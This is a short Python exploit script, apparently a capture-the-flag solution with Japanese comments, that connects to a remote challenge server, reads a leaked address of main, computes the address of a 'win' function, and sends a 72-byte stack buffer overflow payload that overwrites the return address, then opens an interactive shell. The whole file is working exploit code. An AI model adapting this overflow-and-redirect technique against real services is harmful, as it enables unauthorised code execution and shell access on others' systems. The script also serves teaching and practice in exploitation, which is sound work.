from ptrlib import *

elf = ELF("./chal")
io = Socket("nc 34.170.146.252 19295")

# printf("address of main function: %p\n", main); の出力をキャッチ
io.recvuntil("address of main function: ")
main_addr = int(io.recvline(), 16)
logger.info(f"Leaked main address: {hex(main_addr)}")

# (実際のwin) = (リークしたmain) - (バイナリ内のmain) + (バイナリ内のwin)
win_addr = main_addr - elf.symbol("main") + elf.symbol("win")
logger.info(f"Calculated win address: {hex(win_addr)}")

# buffer[64] + saved_rbp[8] = 72バイト埋める
payload = b"A" * 72
payload += p64(win_addr)

# 送信してシェルを取得
io.sendlineafter("input > ", payload)
io.sh()
